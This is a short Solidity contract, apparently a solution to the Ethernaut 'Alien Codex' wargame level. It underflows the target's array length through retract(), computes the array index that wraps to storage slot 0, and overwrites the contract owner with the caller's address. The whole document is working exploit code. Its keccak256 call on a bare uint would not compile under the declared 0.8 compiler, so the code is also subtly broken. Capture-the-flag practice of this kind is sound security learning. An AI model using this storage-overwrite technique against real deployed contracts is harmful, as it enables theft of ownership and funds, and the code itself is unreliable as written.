// SPDX-License-Identifier: none
pragma solidity ^0.8.5;

interface Codex {
    function make_contact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}
contract Reacharound {
    function reachInThere(address $your_ethernaut_address_here) public {
        // instantiate victim contract, underflow array index
        Codex codex = Codex($your_ethernaut_address_here);
        codex.retract();

        // calculate and typecast target values
        uint arrayLengthSlot = 1;
        uint arraySlot = keccak256(arrayLengthSlot);
        // calculate 2**256 - arraySlot + 1
        uint zeroSlot = (115792089237316195423570985008687907853269984665640564039457584007913129639935 - arraySlot) + 1;

        // format msg.sender to bytes to replace owner that is left padded in storage slot
        bytes32 newOwner = bytes32(bytes20(msg.sender)); // rightpadded
        bytes32 shiftedOwner; 
        assembly {
            shiftedOwner := shr(mul(12,8), newOwner) // shr takes bits argument
        }
        
        codex.revise(zeroSlot, shiftedOwner);
    }
}